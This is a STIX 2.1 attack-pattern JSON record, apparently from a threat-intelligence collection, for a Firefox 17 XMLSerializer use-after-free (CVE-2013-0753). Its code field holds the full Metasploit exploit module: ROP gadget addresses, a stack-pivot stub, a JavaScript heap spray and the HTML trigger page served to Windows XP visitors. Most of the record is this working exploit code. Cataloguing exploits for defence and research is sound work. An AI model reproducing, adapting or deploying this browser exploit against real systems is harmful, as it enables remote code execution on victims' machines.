{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d525995e-0f51-4235-b4c8-1dcb98a0215e",
    "created": "2024-08-14T16:45:19.831416Z",
    "modified": "2024-08-14T16:45:19.83142Z",
    "name": "Firefox XMLSerializer Use After Free",
    "description": " This module exploits a vulnerability found on Firefox 17.0 (< 17.0.2), specifically a use-after-free of an Element object, when using the serializeToStream method with a specially crafted OutputStream defining its own write function. This module has been tested successfully with Firefox 17.0.1 ESR, 17.0.1 and 17.0 on Windows XP SP3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_firefox_xmlserializer.rb",
            "external_id": "mozilla_firefox_xmlserializer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0753"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/2013/mfsa2013-16.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=814001"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox XMLSerializer Use After Free',\n      'Description'    => %q{\n        This module exploits a vulnerability found on Firefox 17.0 (< 17.0.2), specifically\n        a use-after-free of an Element object, when using the serializeToStream method\n        with a specially crafted OutputStream defining its own write function. This module\n        has been tested successfully with Firefox 17.0.1 ESR, 17.0.1 and 17.0 on Windows XP\n        SP3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'regenrecht',  # Vulnerability Discovery, Analysis and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-0753' ],\n          [ 'OSVDB', '89021'],\n          [ 'BID', '57209'],\n          [ 'ZDI', '13-006' ],\n          [ 'URL', 'http://www.mozilla.org/security/announce/2013/mfsa2013-16.html' ],\n          [ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=814001' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'PrependMigrate' => true\n        },\n      'Payload'        =>\n        {\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true,\n          'Space'       => 30000 # Indeed a sprayed chunk, just a high value where any payload fits\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Firefox 17  / Windows XP SP3',\n            {\n              'FakeObject'   => 0x0c101008, # Pointer to the Sprayed Memory\n              'FakeVFTable'  => 0x0c10100c, # Pointer to the Sprayed Memory\n              'RetGadget'    => 0x77c3ee16, # ret from msvcrt\n              'PopRetGadget' => 0x77c50d13, # pop # ret from msvcrt\n              'StackPivot'   => 0x77c15ed5, # xcht eax,esp # ret msvcrt\n            }\n          ]\n        ],\n      'DisclosureDate' => '2013-01-08',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def stack_pivot\n    pivot = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    pivot << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    pivot << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    pivot << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n    return pivot\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    vprint_status(\"Agent: #{agent}\")\n\n    if agent !~ /Windows NT 5\\.1/\n      print_error(\"Windows XP not found, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    unless agent =~ /Firefox\\/17/\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    # Fake object landed on 0x0c101008 if heap spray is working as expected\n    code = [\n      target['FakeVFTable'],\n      target['RetGadget'],\n      target['RetGadget'],\n      target['RetGadget'],\n      target['RetGadget'],\n      target['PopRetGadget'],\n      0x88888888, # In order to reach the call to the virtual function, according to the regenrecht's analysis\n    ].pack(\"V*\")\n    code << [target['RetGadget']].pack(\"V\") * 183 # Because you get control with \"call dword ptr [eax+2F8h]\", where eax => 0x0c10100c (fake vftable pointer)\n    code << [target['PopRetGadget']].pack(\"V\") # pop # ret\n    code << [target['StackPivot']].pack(\"V\") # stackpivot # xchg eax # esp # ret\n    code << generate_rop_payload('msvcrt', stack_pivot + payload.encoded, {'target'=>'xp'})\n\n    js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))\n    js_random = Rex::Text.to_unescape(rand_text_alpha(4), Rex::Arch.endian(target.arch))\n    js_ptr = Rex::Text.to_unescape([target['FakeObject']].pack(\"V\"), Rex::Arch.endian(target.arch))\n\n    content = <<-HTML\n<html>\n<script>\nvar heap_chunks;\n\nfunction heapSpray(shellcode, fillsled) {\n  var chunk_size, headersize, fillsled_len, code;\n  var i, codewithnum;\n  chunk_size = 0x40000;\n  headersize = 0x10;\n  fillsled_len = chunk_size - (headersize + shellcode.length);\n  while (fillsled.length <fillsled_len)\n    fillsled += fillsled;\n  fillsled = fillsled.substring(0, fillsled_len);\n  code = shellcode + fillsled;\n  heap_chunks = new Array();\n  for (i = 0; i<1000; i++)\n  {\n    codewithnum = \"HERE\" + code;\n    heap_chunks[i] = codewithnum.substring(0, codewithnum.length);\n  }\n}\n\nfunction gen(len, pad) {\n  pad = unescape(pad);\n\n  while (pad.length < len/2)\n    pad += pad;\n\n  return pad.substring(0, len/2-1);\n}\n\nfunction run() {\n  var container = [];\n\n  var myshellcode = unescape(\"#{js_code}\");\n  var myfillsled = unescape(\"#{js_random}\");\n  heapSpray(myshellcode,myfillsled);\n\n  var fake =\n  \"%u0000%u0000\" +\n  \"%u0000%u0000\" +\n  \"%u0000%u0000\" +\n  \"%u0000%u0000\" +\n  \"%u0000%u0000\" +\n  \"%u0000%u0000\" +\n  \"%u0000%u0000\" +\n  \"#{js_ptr}\";\n\n  var small = gen(72, fake);\n\n  var text = 'x';\n  while (text.length <= 1024)\n    text += text;\n\n  var parent = document.createElement(\"parent\");\n  var child = document.createElement(\"child\");\n\n  parent.appendChild(child);\n  child.setAttribute(\"foo\", text);\n\n  var s = new XMLSerializer();\n  var stream = {\n    write: function() {\n      parent.removeChild(child);\n      child = null;\n      for (i = 0; i < 2097152; ++i)\n        container.push(small.toLowerCase());\n    }\n  };\n\n  s.serializeToStream(parent, stream, \"UTF-8\");\n}\n</script>\n<body onload=\"run();\">\n</body>\n</html>\n    HTML\n\n    print_status(\"URI #{request.uri} requested...\")\n    print_status(\"Sending HTML\")\n    send_response(cli, content, {'Content-Type'=>'text/html'})\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-08",
    "x_mitre_platforms": [
        "win'"
    ]
}